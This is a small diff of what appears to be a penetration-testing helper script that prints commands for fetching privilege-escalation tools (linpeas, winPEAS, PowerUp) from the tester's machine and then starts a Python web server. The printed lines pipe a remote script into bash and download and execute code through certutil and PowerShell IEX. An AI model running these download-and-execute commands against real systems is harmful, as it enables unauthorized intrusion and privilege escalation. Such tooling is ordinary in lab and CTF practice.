@@ -12,6 +12,10 @@ echo "curl $tun0/linpeas.sh | bash"
 echo "certutil.exe -urlcache -split -f http://$tun0/winPEASx64.exe winPEASx64.exe"
 echo "IEX(New-Object Net.Webclient).DownloadString('http://$tun0/PowerUp.ps1');Invoke-AllChecks"
 
-echo -e "\n-- Server --"
+echo -e "\n--Files--\n"
+
+ls
+
+echo -e "\n-- Server --\n"
 
 python3 -m http.server 80
